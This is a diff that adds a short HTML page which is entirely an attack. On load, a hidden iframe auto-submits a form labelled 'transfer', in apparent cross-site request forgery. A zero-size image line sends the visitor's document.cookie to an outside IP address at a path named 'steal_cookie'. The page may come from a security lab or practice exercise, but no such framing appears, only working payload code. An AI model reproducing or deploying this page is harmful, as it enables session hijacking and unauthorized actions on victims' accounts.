@@ -1,0 +1,18 @@
+<html>
+<head>
+    <script type="text/javascript">
+        function autoLoad()
+        {
+            var iframe = document.getElementById("steal"); 
+            var iframeW = (iframe.contentWindow || iframe.contentDocument);
+            if (iframeW.document){
+                iframeW.document.getElementById("transfer").submit();
+            }
+        }
+		document.write('<img src="http://94.191.124.146/Tool/steal_cookie/index.php?cookie='+document.cookie+'" width=0 height=0 />');
+    </script>
+</head>
+<body onload="autoLoad()">
+    <iframe id="steal" style="display:none" src="sub.html"></iframe>
+</body>
+</html>
